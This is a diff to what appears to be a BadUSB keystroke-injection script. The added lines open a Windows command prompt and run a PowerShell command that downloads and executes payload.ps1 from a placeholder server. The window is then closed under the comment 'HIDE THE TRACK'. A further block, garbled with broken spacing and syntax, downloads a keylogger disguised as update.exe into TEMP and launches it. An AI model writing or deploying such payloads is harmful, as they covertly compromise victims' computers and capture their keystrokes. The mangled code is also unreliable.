@@ -92,3 +92,22 @@ EXTENSION LINUX_HID_EXFIL
         RUN_LINUX_EXFIL()
     END_IF_DEFINED
 END_EXTENSION
+REM HIDE THE TRACK
+DELAY 1000
+GUI r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 700
+STRING powershell -nop -c "IEX (New-Object Net.WebClient).DownloadString('http://твой-сервер/payload.ps1')"
+ENTER
+DELAY 1500
+ALT F4
+Powershell
+(>
+$web = New-Object Net. WebClient
+$web. DownloadFile("http://твой-
+сервер/ keylogger. exe"
+"$env: TEMP\update.exe")
+Start-Process
+"$env: TEMP\update. exe"
